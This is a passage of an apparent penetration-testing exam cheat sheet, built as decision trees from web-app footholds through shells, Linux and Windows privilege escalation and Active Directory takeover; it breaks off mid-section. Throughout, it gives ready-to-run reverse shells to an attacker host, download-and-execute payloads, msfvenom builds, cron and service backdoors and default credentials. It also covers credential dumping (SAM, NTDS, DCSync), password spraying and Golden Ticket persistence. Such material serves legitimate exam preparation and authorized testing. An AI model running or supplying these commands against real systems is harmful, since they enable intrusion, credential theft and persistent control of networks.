        └── SPECIFIC CMS/APP detected?
              │
              ├── WordPress ──►
              │     ├── wpscan --url http://<IP> --enumerate u,p,t
              │     ├── Check wp-content/uploads/ for files
              │     ├── Theme/plugin exploits
              │     ├── wp-admin access? ──► Upload plugin with shell
              │     └── XML-RPC attack (brute force amplification)
              │
              ├── Drupal ──►
              │     ├── droopescan scan drupal -u http://<IP>
              │     ├── Drupalgeddon2 (CVE-2018-7600) ──► RCE
              │     ├── Drupalgeddon (CVE-2014-3704) ──► SQLi
              │     ├── PHP filter module ──► Enable and execute PHP
              │     └── Check /admin access
              │
              ├── Joomla ──►
              │     ├── joomscan -u http://<IP>
              │     ├── Check administrator panel
              │     └── Searchsploit joomla <version>
              │
              ├── Tomcat ──►
              │     ├── Default creds: tomcat:tomcat, admin:admin
              │     ├── /manager/html access? ──► Deploy WAR file
              │     └── msfvenom -p java/jsp_shell_reverse_tcp -f war -o shell.war
              │
              ├── GitLab ──►
              │     ├── Check version in /help
              │     ├── Default creds: root:password
              │     ├── Searchsploit gitlab <version>
              │     └── Check for public repos with secrets
              │
              ├── Jenkins ──►
              │     ├── Default creds: admin:admin, admin:password
              │     ├── Script Console ──► Groovy RCE
              │     │     println "whoami".execute().text
              │     └── Check for credentials in build configs
              │
              ├── ColdFusion ──►
              │     ├── Default ports: 80, 443, 5500 (Server Monitor)
              │     ├── Default files: CFIDE/administrator/index.cfm, admin.cfm
              │     ├── Default creds: admin:admin
              │     ├── Directory Traversal (CVE-2010-2861)
              │     ├── RCE (CVE-2009-2265) ──► FCKeditor file upload
              │     └── Searchsploit coldfusion <version>
              │
              ├── Splunk ──►
              │     ├── Default ports: 8000 (web), 8089 (REST API)
              │     ├── Default creds: admin:changeme, admin:admin
              │     ├── If admin access ──► Create custom app for RCE!
              │     │     # Create scripted input with Python/PowerShell reverse shell
              │     └── SSRF (CVE-2018-11409) ──► Access REST API
              │
              ├── osTicket ──►
              │     ├── Look for "powered by osTicket" in footer
              │     ├── Default creds: ostadmin:admin
              │     ├── SSRF (CVE-2020-24881)
              │     ├── Can register with company email → access other services
              │     └── Support tickets may contain sensitive info
              │
              └── Other ──► Searchsploit <app_name> <version>
```

### 3C: Getting a Shell — Decision Tree

```
READY TO GET A SHELL
  │
  ├─► What OS is the target?
  │     │
  │     ├── LINUX ──►
  │     │     │
  │     │     ├── Reverse shell (RECOMMENDED):
  │     │     │     # Start listener first:
  │     │     │     sudo nc -lvnp 443
  │     │     │     │
  │     │     │     # Bash reverse shell:
  │     │     │     bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1
  │     │     │     │
  │     │     │     # Python reverse shell:
  │     │     │     python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
  │     │     │     │
  │     │     │     # Netcat reverse shell:
  │     │     │     rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER> <PORT> > /tmp/f
  │     │     │     │
  │     │     │     # Use msfvenom for custom payload:
  │     │     │     msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f elf -o shell.elf
  │     │     │     │
  │     │     │     # Socat full TTY:
  │     │     │     # Attack machine:
  │     │     │     socat file:`tty`,raw,echo=0 tcp-listen:4444
  │     │     │     # Target:
  │     │     │     socat exec:'bash -li',pty,stderr,setsid,sigint,suspend tcp:<ATTACKER>:4444
  │     │     │
  │     │     └── UPGRADE to full TTY:
  │     │           python3 -c 'import pty;pty.spawn("/bin/bash")'
  │     │           # OR: script /dev/null -c bash
  │     │           Ctrl+Z
  │     │           stty raw -echo; fg
  │     │           export TERM=xterm
  │     │           export SHELL=/bin/bash
  │     │
  │     └── WINDOWS ──►
  │           │
  │           ├── PowerShell reverse shell:
  │           │   powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  │           │
  │           ├── msfvenom payloads:
  │           │   # Reverse TCP shell:
  │           │   msfvenom -p windows/shell/reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f exe -o shell.exe
  │           │   # Meterpreter:
  │           │   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f exe -o shell.exe
  │           │   # Stageless (no second connection):
  │           │   msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f exe -o shell.exe
  │           │
  │           ├── File transfer methods:
  │           │   ├── PowerShell: IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1')
  │           │   ├── PowerShell download: (New-Object Net.WebClient).DownloadFile('http://<ATTACKER>/file.exe','C:\Windows\Temp\file.exe')
  │           │   ├── Certutil: certutil -urlcache -split -f http://<ATTACKER>/shell.exe shell.exe
  │           │   ├── SMB: impacket-smbserver share /tmp/smbshare -smb2support
  │           │   ├── FTP: python3 -m pyftpdlib --port 21
  │           │   └── HTTP: python3 -m http.server 80
  │           │
  │           └── DLL/MSI payloads:
  │                 msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f dll -o shell.dll
  │                 msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f msi -o shell.msi
  │                 # Execute: msiexec /quiet /i shell.msi
  │
  └─► Shell obtained? ──► IMMEDIATELY:
        ├── whoami / id
        ├── hostname
        ├── ifconfig / ipconfig
        ├── Check OS version
        └── Go to Phase 4: Post-Exploitation
```

---

## Phase 4: Post-Exploitation & Privilege Escalation

### 4A: Linux Privilege Escalation Decision Tree

```
LINUX SHELL OBTAINED (low-priv user)
  │
  ├─► STEP 1: Stabilize shell (if not already)
  │     python3 -c 'import pty;pty.spawn("/bin/bash")'
  │     # OR: script /dev/null -c bash
  │     Ctrl+Z → stty raw -echo; fg → export TERM=xterm
  │
  ├─► STEP 2: Automated enumeration (transfer & run)
  │     # From attack machine:
  │     python3 -m http.server 80
  │     # On target:
  │     wget http://<ATTACKER>/linpeas.sh
  │     chmod +x linpeas.sh && ./linpeas.sh
  │
  ├─► STEP 3: Manual enumeration checklist
  │     │
  │     ├── WHO AM I?
  │     │     id, whoami, groups
  │     │
  │     ├── WHAT CAN I RUN AS ROOT?
  │     │     sudo -l  ← CRITICAL CHECK
  │     │     │
  │     │     ├── (ALL : ALL) ALL ──► sudo su / sudo bash
  │     │     ├── (root) NOPASSWD: <cmd> ──► GTFOBins lookup
  │     │     │     └── https://gtfobins.github.io/
  │     │     ├── (root) env_keep+=LD_PRELOAD ──► LD_PRELOAD attack
  │     │     └── (root) <specific_binary> ──► Check GTFOBins for escape
  │     │
  │     ├── SUID/GTFOBins:
  │     │     find / -perm -4000 2>/dev/null
  │     │     find / -perm -6000 2>/dev/null
  │     │     │
  │     │     └── Unusual SUID binaries? ──► GTFOBins
  │     │           ├── find ──► find . -exec /bin/bash -p \;
  │     │           ├── vim ──► vim -c ':!/bin/bash'
  │     │           ├── python ──► python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
  │     │           ├── nmap ──► nmap --interactive → !sh
  │     │           ├── bash ──► bash -p
  │     │           ├── env ──► env /bin/bash -p
  │     │           └── cp ──► Overwrite /etc/passwd
  │     │
  │     ├── CAPABILITIES:
  │     │     getcap -r / 2>/dev/null
  │     │     │
  │     │     └── cap_setuid+ep ──► Privilege escalation
  │     │           ├── python: python -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
  │     │           ├── perl: perl -e 'use POSIX qw(setuid); setuid(0); exec("/bin/bash");'
  │     │           └── cap_dac_read_search ──► Read any file
  │     │
  │     ├── CRON JOBS:
  │     │     cat /etc/crontab
  │     │     ls -la /etc/cron.d/
  │     │     crontab -l
  │     │     │
  │     │     └── Writable cron script? ──► Add reverse shell
  │     │           echo 'bash -i >& /dev/tcp/<ATTACKER>/<PORT> 0>&1' >> /opt/script.sh
  │     │
  │     ├── SENSITIVE FILES:
  │     │     cat /etc/shadow (readable?)
  │     │     cat /etc/passwd (for user list)
  │     │     find / -name "*.conf" 2>/dev/null | xargs grep -i password
  │     │     find / -name id_rsa 2>/dev/null
  │     │     find / -name ".bash_history" 2>/dev/null -exec cat {} \;
  │     │     find / -name "wp-config.php" 2>/dev/null -exec cat {} \;
  │     │     find / -name "web.config" 2>/dev/null -exec cat {} \;
  │     │     find / -name ".env" 2>/dev/null -exec cat {} \;
  │     │
  │     ├── KERNEL EXPLOITS:
  │     │     uname -a
  │     │     searchsploit linux kernel <version> privilege escalation
  │     │     │
  │     │     └── Use with CAUTION — may crash the system!
  │     │
  │     ├── RUNNING SERVICES:
  │     │     ss -tlnp  (internal services?)
  │     │     netstat -tlnp
  │     │     │
  │     │     └── Local service on port X? ──► May be vulnerable
  │     │           └── Forward port with SSH/chisel to attack machine
  │     │
  │     ├── CREDENTIALS IN FILES:
  │     │     grep -ri password /home/ 2>/dev/null
  │     │     grep -ri password /var/log/ 2>/dev/null
  │     │     grep -ri password /opt/ 2>/dev/null
  │     │     cat .bash_history
  │     │     env  (check for API keys, credentials)
  │     │     printenv
  │     │
  │     ├── NFS SHARES:
  │     │     cat /etc/exports
  │     │     │
  │     │     └── no_root_squash? ──► Mount and write SUID binary
  │     │
  │     ├── DOCKER:
  │     │     id | grep docker
  │     │     │
  │     │     └── Docker group? ──► docker run -v /:/mnt --rm -it ubuntu bash
  │     │
  │     ├── LXD/LXC:
  │     │     id | grep lxd
  │     │     │
  │     │     └── LXD group? ──► Build and import Alpine container, mount root FS
  │     │
  │     └── WRITABLE PATHS:
  │           find / -writable -type d 2>/dev/null
  │           │
  │           └── Writable path in $PATH? ──► Hijack binary
  │                 echo '/bin/bash -p' > /path/to/writable/hijacked_binary
  │                 chmod +x /path/to/writable/hijacked_binary
  │
  └─► STEP 4: Escalate!
        │
        ├── sudo misconfiguration? ──► GTFOBins
        ├── SUID binary? ──► GTFOBins
        ├── Writable cron job? ──► Add payload
        ├── Kernel exploit? ──► Use with caution (may crash!)
        ├── Credentials found? ──► su - or ssh as other user
        ├── Capabilities? ──► Exploit cap_setuid
        ├── NFS no_root_squash? ──► Mount + SUID
        ├── Docker group? ──► Mount root filesystem
        ├── Internal service? ──► Port forward and attack
        └── Writable path hijack? ──► Replace binary
```

### 4B: Windows Privilege Escalation Decision Tree

```
WINDOWS SHELL OBTAINED (low-priv user)
  │
  ├─► STEP 1: Situational Awareness
  │     whoami /all
  │     systeminfo
  │     hostname
  │     net user
  │     net localgroup administrators
  │     ipconfig /all
  │     route print
  │
  ├─► STEP 2: Automated enumeration
  │     # Transfer and run winPEAS:
  │     certutil -urlcache -split -f http://<ATTACKER>/winPEAS.exe winPEAS.exe
  │     .\winPEAS.exe
  │     │
  │     # OR: Run PowerUp.ps1
  │     Import-Module PowerUp.ps1
  │     Invoke-AllChecks
  │
  ├─► STEP 3: Manual enumeration checklist
  │     │
  │     ├── PRIVILEGES (whoami /priv):
  │     │     │
  │     │     ├── SeImpersonatePrivilege ──► Potato attacks!
  │     │     │     ├── Windows Server 2019/10: PrintSpoofer / GodPotato
  │     │     │     │     PrintSpoofer.exe -i -c "cmd /c cmd"
  │     │     │     │     GodPotato.exe -cmd "cmd /c cmd"
  │     │     │     │
  │     │     │     ├── Windows Server 2016 and earlier: JuicyPotato
  │     │     │     │     JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
  │     │     │     │
  │     │     │     └── RoguePotato (if JuicyPotato fails on newer Windows)
  │     │     │           RoguePotato.exe -r <ATTACKER> -e "cmd" -l 9999
  │     │     │
  │     │     ├── SeBackupPrivilege ──► Read any file (SAM, SYSTEM, NTDS.dit)
  │     │     │     reg save hklm\sam sam
  │     │     │     reg save hklm\system system
  │     │     │     # OR for NTDS.dit:
  │     │     │     robocopy /b C:\Windows\NTDS C:\NTDS ntds.dit
  │     │     │     secretsdump.py -sam sam -system system LOCAL
  │     │     │
  │     │     ├── SeDebugPrivilege ──► Inject into SYSTEM process
  │     │     │     # Use mimikatz or migrate to SYSTEM process
  │     │     │
  │     │     ├── SeLoadDriverPrivilege ──► Load malicious driver
  │     │     │
  │     │     └── SeTakeOwnershipPrivilege ──► Take ownership of any file
  │     │
  │     ├── TOKEN IMPERSONATION:
  │     │     # With Meterpreter:
  │     │     use incognito
  │     │     list_tokens -u
  │     │     impersonate_token "NT AUTHORITY\SYSTEM"
  │     │
  │     │     # With named pipes:
  │     │     # Check for impersonation-capable named pipes
  │     │     pipelist.exe /accepteula
  │     │
  │     ├── UNQUOTED SERVICE PATHS:
  │     │     wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
  │     │     │
  │     │     └── Writable path? ──► Place malicious binary
  │     │           # e.g., C:\Program Files\My Service\service.exe
  │     │           # Place malicious exe at C:\Program.exe or C:\Program Files\My.exe
  │     │
  │     ├── SERVICE PERMISSIONS:
  │     │     accesschk.exe /accepteula -uwcqv "Authenticated Users" *
  │     │     accesschk.exe /accepteula -uwcqv "Everyone" *
  │     │     │
  │     │     └── Can modify service? ──► Change binPath
  │     │           sc config <service> binPath= "cmd /c net user hacker P@ss123 /add & net localgroup administrators hacker /add"
  │     │           sc stop <service>
  │     │           sc start <service>
  │     │
  │     ├── DLL HIJACKING:
  │     │     # Check for missing DLLs in application directories
  │     │     # Use Process Monitor (ProcMon) to identify
  │     │     # Place malicious DLL in writable search path
  │     │
  │     ├── STORED CREDENTIALS:
  │     │     cmdkey /list
  │     │     │
  │     │     └── Saved credentials? ──► runas /savecred
  │     │           runas /savecred /user:admin cmd.exe
  │     │
  │     ├── AUTOLOGON CREDENTIALS:
  │     │     reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
  │     │     │
  │     │     └── DefaultPassword found? ──► Use it!
  │     │
  │     ├── ALWAYS INSTALLED ELEVATED:
  │     │     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  │     │     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  │     │     │
  │     │     └── Both set to 1? ──► Install malicious MSI as SYSTEM
  │     │           msiexec /quiet /qn /i shell.msi
  │     │
  │     ├── SAVED WIFI PASSWORDS:
  │     │     netsh wlan show profiles
  │     │     netsh wlan show profile name="<SSID>" key=clear
  │     │
  │     ├── DNS ADMINS GROUP:
  │     │     net localgroup "DnsAdmins"
  │     │     │
  │     │     └── Member? ──► Load malicious DLL
  │     │           dnscmd <servername> /config /serverlevelplugindll \\<ATTACKER>\share\malicious.dll
  │     │
  │     ├── SEARCH FOR PASSWORDS:
  │     │     findstr /si "password" *.txt *.ini *.xml *.config 2>nul
  │     │     findstr /si "password" C:\Users\* 2>nul
  │     │     reg query HKLM /f password /t REG_SZ /s
  │     │     reg query HKCU /f password /t REG_SZ /s
  │     │
  │     ├── SCHEDULED TASKS:
  │     │     schtasks /query /fo LIST /v
  │     │     │
  │     │     └── Writable task running as SYSTEM? ──► Replace binary
  │     │
  │     ├── REGISTRY AUTO-RUN:
  │     │     reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
  │     │     reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
  │     │     │
  │     │     └── Writable entry? ──► Replace with malicious binary
  │     │
  │     └── INTERNAL SERVICES:
  │           netstat -ano
  │           │
  │           └── Service on 127.0.0.1? ──► Port forward and attack
  │                 # Chisel or SSH port forwarding
  │
  └─► STEP 4: Escalate!
        │
        ├── SeImpersonatePrivilege? ──► PrintSpoofer/GodPotato/JuicyPotato
        ├── SeBackupPrivilege? ──► Dump SAM/SYSTEM/NTDS.dit
        ├── SeDebugPrivilege? ──► Inject into SYSTEM process
        ├── Service misconfiguration? ──► Modify service binary
        ├── Unquoted service path? ──► Plant binary in path
        ├── AlwaysInstallElevated? ──► Malicious MSI
        ├── Stored credentials? ──► runas /savecred
        ├── DnsAdmins? ──► Load malicious DLL
        ├── Token impersonation? ──► Incognito / named pipes
        ├── Kernel exploit? ──► Use with caution!
        └── Pass-the-Hash? ──► If NTLM hash obtained
              crackmapexec smb <IP> -u user -H <NTLM_HASH>
              psexec.py <domain>/user@<IP> -hashes <LM>:<NTLM>
```

---

## Phase 5: Active Directory Domain Dominance

> **This is the most critical section for the CPTS exam. AD environments are the primary target.**

### 5A: Initial AD Enumeration (No Credentials)

```
AD ENVIRONMENT DETECTED (Ports 88, 389, 445, 636)
  │
  ├─► STEP 1: Identify the Domain
  │     nmap -sC -sV <IP> | grep -i "domain\|netbios\|dns"
  │     crackmapexec smb <IP>
  │     │
  │     └── Note: Domain name, DC hostname, FQDN
  │
  ├─► STEP 2: LLMNR/NBT-NS Poisoning (Responder)
  │     sudo responder -I <interface> -dwf
  │     │
  │     ├── Captured NTLMv2 hash? ──► Crack it!
  │     │     hashcat -m 5600 hash.txt rockyou.txt
  │     │     │
  │     │     └── Cracked? ──► You have credentials! Go to STEP 5
  │     │
  │     └── Can't crack? ──► Try NTLM Relay
  │           ntlmrelayx.py -tf targets.txt -smb2support
  │           │
  │           └── Relay to host with SMB signing disabled
  │
  ├─► STEP 3: User Enumeration (No Auth Required)
  │     kerbrute userenum --dc <IP> -d <domain> usernames.txt
  │     │
  │     └── Build validated user list
  │
  ├─► STEP 4: AS-REP Roasting (No Auth Required!)
  │     GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP>
  │     │
  │     ├── Got hash? ──► Crack it!
  │     │     hashcat -m 18200 hash.txt rockyou.txt
  │     │
  │     └── Cracked? ──► You have credentials! Go to STEP 5
  │
  └─► STEP 5: Password Spraying
        ├── Build target list from Kerbrute/enum4linux
        ├── Check password policy first (if possible):
        │     crackmapexec smb <IP> -u '' -p '' --pass-pol
        │     rpcclient -U "" <IP> -c "getdompwinfo"
        │
        ├── Spray common passwords:
        │     crackmapexec smb <IP> -u users.txt -p 'Spring2024!'
        │     crackmapexec smb <IP> -u users.txt -p 'Welcome1!'
        │     crackmapexec smb <IP> -u users.txt -p 'Password1!'
        │     kerbrute passwordspray -d <domain> --dc <IP> users.txt 'Spring2024!'
        │
        └── Got valid credentials? ──► Go to 5B: Authenticated AD Enumeration
```

### 5B: Authenticated AD Enumeration (With Credentials)

```
VALID DOMAIN CREDENTIALS OBTAINED
  │
  ├─► STEP 1: Verify credentials work
  │     crackmapexec smb <IP> -u user -p pass
  │     │
  │     ├── Pwn3d! ──► You have admin access!
  │     └── Valid ──► Continue enumeration
  │
  ├─► STEP 2: BloodHound Collection (CRITICAL!)
  │     # From Linux:
  │     bloodhound-python -u user -p pass -d <domain> -c All -ns <DC_IP>
  │     │
  │     # From Windows (if on domain-joined host):
  │     SharpHound.exe -c All
  │     # OR PowerShell:
  │     Invoke-BloodHound -CollectionMethod All
  │     │
  │     └── Import into BloodHound GUI and analyze:
  │           ├── Find shortest path to Domain Admins
  │           ├── Find computers where user has admin access
  │           ├── Check for Kerberoastable users
  │           ├── Check for AS-REP Roastable users
  │           ├── Look for ACL abuse paths (GenericAll, WriteDacl, etc.)
  │           └── Check for constrained/unconstrained delegation
  │
  ├─► STEP 3: LDAP Enumeration
  │     ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com" -u user -p pass
  │     windapsearch -d <domain> -u user -p pass --dc <IP> -C  (computers)
  │     windapsearch -d <domain> -u user -p pass --dc <IP> -G  (groups)
  │     │
  │     └── Look for: users, groups, GPOs, SPNs, trust relationships
  │
  ├─► STEP 4: SMB Share Enumeration
  │     crackmapexec smb <IP> -u user -p pass --shares
  │     smbmap -H <IP> -u user -p pass
  │     │
  │     └── Check SYSVOL for GPP passwords:
  │           findstr /S cpassword \\<DC>\SYSVOL\<domain>\Policies\*.xml
  │           gpp-decrypt <cpassword_hash>
  │
  ├─► STEP 5: PowerView Enumeration (from Windows)
  │     Import-Module PowerView.ps1
  │     Get-DomainUser
  │     Get-DomainComputer
  │     Get-DomainGroup
  │     Get-DomainTrust
  │     Get-DomainOU
  │     Get-DomainGPO
  │     Find-LocalAdminAccess
  │     Get-DomainUser -SPN  (Kerberoastable users)
  │     Get-DomainUser -PreauthNotRequired  (AS-REP Roastable)
  │
  ├─► STEP 6: Enumerate LAPS (if deployed)
  │     # Check if LAPS is in use:
  │     ldapsearch -x -H ldap://<IP> -b "dc=domain,dc=com" "(ms-Mcs-AdmPwd=*)"
  │     # With PowerView/LAPSToolkit:
  │     Find-LAPSDelegatedGroups
  │     Get-LAPSComputers
  │
  └─► STEP 7: Enumerate delegation
        ├── Unconstrained delegation:
        │     Get-DomainComputer -Unconstrained
        │     │
        │     └── If we compromise this computer, we get TGTs for ALL users
        │
        ├── Constrained delegation:
        │     Get-DomainUser -TrustedToAuth
        │     Get-DomainComputer -TrustedToAuth
        │     │
        │     └── Can S4U to impersonate any user to the delegated service
        │
        └── Resource-Based Constrained Delegation:
              Get-DomainObject -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
              │
              └── If we can write msDS-AllowedToActOnBehalfOfOtherIdentity,
                    we can impersonate any user to that computer
```

### 5C: AD Attack Techniques

```
CREDENTIALS OBTAINED ──► CHOOSE ATTACK BASED ON SITUATION
  │
  ├─► Kerberoasting (Need ANY valid domain credentials)
  │     GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request
  │     │
  │     ├── Target high-privilege SPNs (SQL, IIS, Exchange)
  │     ├── Crack TGS hash:
  │     │     hashcat -m 13100 hash.txt rockyou.txt
  │     │     hashcat -m 13100 hash.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule
  │     │
  │     └── From Windows (Rubeus):
  │           Rubeus.exe kerberoast /outfile:hashes.txt
  │
  ├─► AS-REP Roasting (No auth needed for some users)
  │     GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP>
  │     # With credentials:
  │     GetNPUsers.py <domain>/<user>:<pass> -request
  │     │
  │     └── Crack hash: hashcat -m 18200 hash.txt rockyou.txt
  │
  ├─► ACL Attacks (Identified via BloodHound)
  │     │
  │     ├── GenericAll on User ──► Reset password or set SPN for Kerberoast
  │     │     # Reset password:
  │     │     net user <target> <newpass> /domain
  │     │     # OR with PowerView:
  │     │     Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'P@ss123' -AsPlainText -Force)
  │     │     # OR set SPN and Kerberoast:
  │     │     Set-DomainObject -Identity <target> -Set @{serviceprincipalname='fake/SPN'}
  │     │     GetUserSPNs.py <domain>/<user>:<pass> -request-user <target>
  │     │
  │     ├── GenericAll on Group ──► Add ourselves to the group
  │     │     Add-DomainGroupMember -Identity "Domain Admins" -Members <our_user>
  │     │     # OR: net group "Domain Admins" <our_user> /add /domain
  │     │
  │     ├── GenericAll on Computer ──► Shadow Credentials attack
  │     │     # Add msDS-KeyCredentialLink to computer object
  │     │     # Then use PKINITtools to get TGT and NT hash
  │     │
  │     ├── WriteDacl on User ──► Grant ourselves GenericAll, then reset password
  │     │     Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <our_user> -Rights GenericAll
  │     │     Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'P@ss123' -AsPlainText -Force)
  │     │
  │     ├── ForceChangePassword ──► Just change it
  │     │     Set-DomainUserPassword -Identity <target> -AccountPassword (ConvertTo-SecureString 'P@ss123' -AsPlainText -Force)
  │     │
  │     └── WriteOwner ──► Change owner to ourselves, then grant GenericAll
  │           Set-DomainObjectOwner -Identity <target> -OwnerIdentity <our_user>
  │           Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <our_user> -Rights GenericAll
  │
  ├─► NTLM Relay Attacks
  │     # Step 1: Find hosts with SMB signing disabled
  │     crackmapexec smb <subnet> --signing
  │     │
  │     # Step 2: Set up relay
  │     ntlmrelayx.py -tf targets.txt -smb2support
  │     │
  │     # Step 3: Trigger authentication
  │     # Use PetitPotam to coerce DC to authenticate:
  │     python3 PetitPotam.py <ATTACKER> <DC_IP>
  │     │
  │     └── Relay to LDAP on DC ──► Create new admin user!
  │           ntlmrelayx.py -t ldap://<DC_IP> -wh <ATTACKER> --delegate-access
  │
  ├─► Shadow Credentials Attack (if PKINIT and msDS-KeyCredentialLink writable)
  │     # Check if we can write to msDS-KeyCredentialLink:
  │     # (Identified via BloodHound - GenericAll/GenericWrite on computer)
  │     │
  │     pywhisker.py -d <domain> -u <user> -p <pass> --target <computer$> --action add
  │     │
  │     # Get TGT with the certificate:
  │     gettgtpkinit.py -cert-pfx <cert>.pfx <domain>/<computer$> <TGT.ccache>
  │     │
  │     # Get NT hash:
  │     getnthash.py <domain>/<computer$> -key <AS-REP key> -dc-ip <DC_IP>
  │     │
  │     └── Use NT hash for Pass-the-Hash or DCSync
  │
  ├─► Pass-the-Hash
  │     crackmapexec smb <IP> -u user -H <NTLM_HASH>
  │     psexec.py -hashes <LM>:<NTLM> <domain>/user@<IP>
  │     evil-winrm -i <IP> -u user -H <NTLM_HASH>
  │     xfreerdp /v:<IP> /u:user /pth:<NTLM_HASH>
  │
  ├─► Overpass-the-Hash (Pass-the-Key)
  │     # Get TGT using NT hash:
  │     getTGT.py <domain>/<user> -hashes <LM>:<NTLM>
  │     export KRB5CCNAME=<user>.ccache
  │     psexec.py <domain>/user@<IP> -k -no-pass
  │
  ├─► Pass-the-Ticket
  │     # From Windows (Rubeus):
  │     Rubeus.exe dump /service:krbtgt
  │     Rubeus.exe ptt /ticket:<base64_ticket>
  │     │
  │     # From Linux:
  │     export KRB5CCNAME=<ticket>.ccache
  │     psexec.py <domain>/user@<IP> -k -no-pass
  │
  ├─► DCSync Attack (Need Domain Admin or Replication Rights)
  │     secretsdump.py <domain>/<admin>:<pass>@<DC_IP>
  │     # OR with hash:
  │     secretsdump.py <domain>/<admin>@<DC_IP> -hashes <LM>:<NTLM>
  │     │
  │     └── Dump ALL domain hashes! Including krbtgt for Golden Ticket
  │
  ├─► Golden Ticket Attack (Need krbtgt hash)
  │     ticketer.py -domain <domain> -domain-sid <SID> -nthash <krbtgt_hash> <fake_user>
  │     export KRB5CCNAME=<fake_user>.ccache
  │     psexec.py <domain>/<fake_user>@<IP> -k -no-pass
  │     │
  │     └── Persistence: Valid for any user, any time, forever
  │
  ├─► Silver Ticket Attack (Need service account NT hash)
  │     ticketer.py -spn <service>/<host> -domain <domain> -domain-sid <SID> -nthash <service_hash> <user>
  │     export KRB5CCNAME=<user>.ccache
  │     │
  │     └── Access specific service without contacting DC
  │
  ├─► noPac.py (CVE-2021-42278 + CVE-2021-42287)
  │     # If domain is vulnerable, impersonate Domain Admin from standard user
  │     noPac.py <domain>/<user>:<pass> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME>
  │
  ├─► PrintNightmare (CVE-2021-1675)
  │     CVE-2021-1675.py <domain>/<user>:<pass>@<IP> '\\<ATTACKER>\share\shell.dll'
  │
  ├─► PetitPotam (CVE-2021-36942)
  │     # Coerce authentication from DC
  │     python3 PetitPotam.py <ATTACKER> <DC_IP>
  │     │
  │     └── Combine with ntlmrelayx for AD CS or LDAP relay
  │
  ├─► GPP Password Decryption
  │     # Find cpassword in SYSVOL:
  │     findstr /S cpassword \\<DC>\SYSVOL\<domain>\Policies\*.xml
  │     # Decrypt:
  │     gpp-decrypt <cpassword_hash>
  │     # OR with crackmapexec:
  │     crackmapexec smb <IP> -u user -p pass --gpp-password
  │
  ├─► AD CS (Active Directory Certificate Services) Attacks
  │     # Check if AD CS is deployed:
  │     certipy find -u <user>@<domain> -p <pass> -dc-ip <DC_IP>
  │     │
  │     ├── ESC1 - Misconfigured Certificate Templates (SAN + Client Auth):
  │     │     certipy req -u <user>@<domain> -p <pass> -ca <CA_NAME> -template <TEMPLATE> -upn administrator@<domain>
  │     │     certipy auth -pfx administrator.pfx -domain <domain>
  │     │
  │     ├── ESC2 - Any Purpose EKU (similar to ESC1)
  │     ├── ESC3 - Certificate Request Agent (enroll on behalf of another user)
  │     ├── ESC4 - Vulnerable Certificate Template ACL (overwrite template)
  │     │     certipy template -u <user>@<domain> -p <pass> -template <TEMPLATE> -save-old
  │     ├── ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 (CA allows SAN in any template)
  │     ├── ESC7 - Vulnerable CA ACL (grant yourself certificate officer rights)
  │     │
  │     └── PetitPotam + AD CS Relay:
  │           python3 PetitPotam.py <ATTACKER> <DC_IP>
  │           ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp -smb2support --adcs
  │
  └─► Domain Trust Attacks (Child → Parent)
        # From child domain, escalate to parent:
        raiseChild.py <child_domain>/<user>:<pass>
        │
        └── Automated child-to-parent domain privilege escalation
```

### 5D: Credential Harvesting from Compromised Hosts

```
SYSTEM/SHELL ON DOMAIN-JOINED HOST
  │
  ├─► LINUX host:
  │     ├── cat /etc/shadow (hashes for cracking)
  │     ├── find / -name id_rsa 2>/dev/null (SSH keys)
  │     ├── cat .bash_history
  │     ├── grep -ri password /home/ /opt/ /var/ 2>/dev/null
  │     ├── cat /etc/hosts (other hosts?)
  │     ├── arp -a / ss -tlnp (internal services)
  │     ├── Database credentials in config files
  │     └── Check for Kerberos tickets in /tmp/krb5cc_*
  │
  ├─► WINDOWS host:
